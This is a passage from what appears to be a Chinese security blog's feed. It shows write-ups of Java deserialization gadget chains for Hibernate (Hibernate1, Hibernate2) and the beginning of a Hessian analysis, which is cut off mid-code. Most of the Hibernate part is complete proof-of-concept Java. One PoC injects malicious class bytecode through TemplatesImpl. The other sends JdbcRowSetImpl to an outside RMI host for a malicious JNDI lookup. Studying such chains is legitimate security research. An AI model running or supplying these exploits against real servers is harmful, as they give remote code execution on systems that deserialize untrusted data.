class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Hibernate1.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass             = Class.forName(<span class="string">&quot;org.hibernate.type.ComponentType&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Method</span>  <span class="variable">method</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredMethod(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object getter;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       getterImpl  = Class.forName(<span class="string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(<span class="literal">null</span>, <span class="literal">null</span>, method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       basicGetter = Class.forName(<span class="string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(tmpl.getClass(), method, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tuplizer</span> <span class="operator">=</span> createWithoutConstructor(pojoComponentTuplizerClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> abstractComponentTuplizerClass.getDeclaredField(<span class="string">&quot;getters&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> Array.newInstance(getter.getClass(), <span class="number">1</span>);</span><br><span class="line">        Array.set(getters, <span class="number">0</span>, getter);</span><br><span class="line">        field.set(tuplizer, getters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">type</span> <span class="operator">=</span> createWithoutConstructor(componentTypeClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span></span><br><span class="line">        setFieldValue(type,<span class="string">&quot;componentTuplizer&quot;</span>,tuplizer);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertyTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;(Type) type&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>((Type) type, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建反序列化用 HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(typedValue, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span></span><br><span class="line">        setFieldValue(typedValue,<span class="string">&quot;value&quot;</span>,tmpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230713233831925.png" alt="image-20230713233831925"></p><p><strong>完整的利用链</strong></p><p><img src="../images/image-20230713233920372.png" alt="image-20230713233920372"></p><p><strong>这里这样写是因为版本的不同  调用链在这一块也是会不同的</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><strong>利用说明：</strong><ul><li><strong>由 HashMap 的反序列化触发 TypedValue 的 <code>hashCode</code>，调用到 ComponentType 的 <code>getHashCode</code> 方法，调用 PojoComponentTuplizer 的 <code>getPropertyValue</code> 的方法，然后使用 <code>BasicPropertyAccessor$BasicGetter</code> 调用 <code>get</code> 方法，触发 TemplatesImpl 的 <code>getOutputProperties</code> 方法。</strong></li></ul></li></ol><ol><li>依赖版本</li></ol><p><strong>Hibernate : 3-5</strong></p><ol><li><strong>本次复现用的依赖版本</strong></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.hibernate/hibernate-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.11.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230713234611171.png" alt="image-20230713234611171"></p><p><strong>这位师傅提出了一个想法  可以学习一下为什么</strong>   </p><h2 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h2><p>既然是触发 <code>getter</code> 方法，这就让我们想到了 <code>fastjson</code> 的经典触发方式，除了 <code>TemplatesImpl</code> 实例化恶意类字节码，还有 <code>JdbcRowSetImpl</code> 触发恶意 <code>JNDI</code> 查询，<code>Hibernate2</code> 就是这种方式，不知道这两个漏洞是谁先出的，谁借鉴的谁。</p><p>在 <code>fastjson</code> 中使用 <code>JdbcRowSetImpl</code> 的 <code>setAutoCommit</code>（setter）方法触发 <code>JNDI</code> 查询，而在 <code>Hibernate2</code> 中由于是触发 getter 方法，因此我们选择 <code>getDatabaseMetaData</code>。</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Hibernate1.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass             = Class.forName(<span class="string">&quot;org.hibernate.type.ComponentType&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成JdbcRowxxx</span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        rs.setDataSourceName(<span class="string">&quot;rmi://192.168.142.129:9999/evilclass&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> JdbcRowSetImpl.class.getDeclaredMethod(<span class="string">&quot;getDatabaseMetaData&quot;</span>);</span><br><span class="line">        Object getter;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       getterImpl  = Class.forName(<span class="string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(<span class="literal">null</span>, <span class="literal">null</span>, method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       basicGetter = Class.forName(<span class="string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(rs.getClass(), method, <span class="string">&quot;databaseMetaData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tuplizer</span> <span class="operator">=</span> createWithoutConstructor(pojoComponentTuplizerClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> abstractComponentTuplizerClass.getDeclaredField(<span class="string">&quot;getters&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> Array.newInstance(getter.getClass(), <span class="number">1</span>);</span><br><span class="line">        Array.set(getters, <span class="number">0</span>, getter);</span><br><span class="line">        field.set(tuplizer, getters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">type</span> <span class="operator">=</span> createWithoutConstructor(componentTypeClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span></span><br><span class="line">        setFieldValue(type,<span class="string">&quot;componentTuplizer&quot;</span>,tuplizer);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertyTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;(Type) type&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>((Type) type, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建反序列化用 HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(typedValue, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span></span><br><span class="line">        setFieldValue(typedValue,<span class="string">&quot;value&quot;</span>,rs);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230714002402940.png" alt="image-20230714002402940"></p><p><img src="../images/image-20230714002411609.png" alt="image-20230714002411609"></p><p><strong>这样就能执行了   (只是比较慢)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/&quot;&gt;参考链</summary>
      
    
    
    
    
    <category term="java-Hibernate" scheme="https://ke1nys.github.io/tags/java-Hibernate/"/>
    
  </entry>
  
  <entry>
    <title>show-JWT</title>
    <link href="https://ke1nys.github.io/posts/fb5deb43.html"/>
    <id>https://ke1nys.github.io/posts/fb5deb43.html</id>
    <published>2023-07-10T15:10:19.000Z</published>
    <updated>2023-07-10T16:13:36.932Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="341e88597f819d950b0f5c90612b48ba043f42566158cb0c370a43fd3332b7da"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-JWT" scheme="https://ke1nys.github.io/tags/show-JWT/"/>
    
  </entry>
  
  <entry>
    <title>show-SSRF</title>
    <link href="https://ke1nys.github.io/posts/ded151a6.html"/>
    <id>https://ke1nys.github.io/posts/ded151a6.html</id>
    <published>2023-07-09T03:19:01.000Z</published>
    <updated>2023-07-10T14:06:11.088Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9292b9611376b0203a8170a1f562518caf516bdb820d1b690e6cc554e5a64e98"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-SSRF" scheme="https://ke1nys.github.io/tags/show-SSRF/"/>
    
  </entry>
  
  <entry>
    <title>java-Hessian</title>
    <link href="https://ke1nys.github.io/posts/8319cacd.html"/>
    <id>https://ke1nys.github.io/posts/8319cacd.html</id>
    <published>2023-06-25T06:40:33.000Z</published>
    <updated>2023-07-06T14:02:11.671Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1193">文章1</a>    <a href="https://su18.org/post/hessian/#xbean">文章2</a>  <a href="https://juejin.cn/post/7130570567547093023">文章3  字节</a>    <a href="http://moonflower.fun/index.php/2022/05/28/336/">文章4</a></p><p>这里前言和简介就不写了  上面给的文章写的都很清楚了   直接看就行了</p><p>(<strong>就是prc啥的  直接看上面的文章就行了</strong>)</p><p>这里的只分析链子</p><h2 id="Hessian反序列化漏洞分析"><a href="#Hessian反序列化漏洞分析" class="headerlink" title="Hessian反序列化漏洞分析"></a>Hessian反序列化漏洞分析</h2><p>Hessian反序列化漏洞的关键出在<code>HessianInput#readObject</code>，由于Hessian会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为77）。下面我们跟进<code>readObject()</code></p><p><code>HessianInput#readObject</code>部分代码如下</p><p><img src="../images/image-20230625153912111.png" alt="image-20230625153912111"></p><p>打个断点来进行分析</p><p><img src="../images/image-20230625153943252.png" alt="image-20230625153943252"></p><p>跟进这个<code>readMap</code>()方法</p><p><img src="../images/image-20230625154035372.png" alt="image-20230625154035372"></p><p>接着跟进这个<code>getDeserializer</code>()方法    获取反序列化的返回结果</p><p><img src="../images/image-20230625154203052.png" alt="image-20230625154203052"></p><p>在获取到<code>deserializer</code>后，java会创建一个HashMap作为缓存，并将我们需要反序列化的类作为<code>key</code>放入HashMap中。</p><p><strong>看过rome链子的应该能反应过来这里 </strong>    <code>hashmap</code>   <code>key</code></p><p>后续代码能够触发任意类的<code>hashcode()</code>方法</p><p><img src="../images/image-20230625160235189.png" alt="image-20230625160235189"></p><p>因为这个<code>key</code>可控</p><p>至此，我们Gadget的构造思路也就十分清晰了，只需要找一条入口为hashcode()的反序列化链即可，比如我们常用的ROME链</p><h3 id="Hessian-Rome"><a href="#Hessian-Rome" class="headerlink" title="Hessian+Rome"></a>Hessian+Rome</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>利用链如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 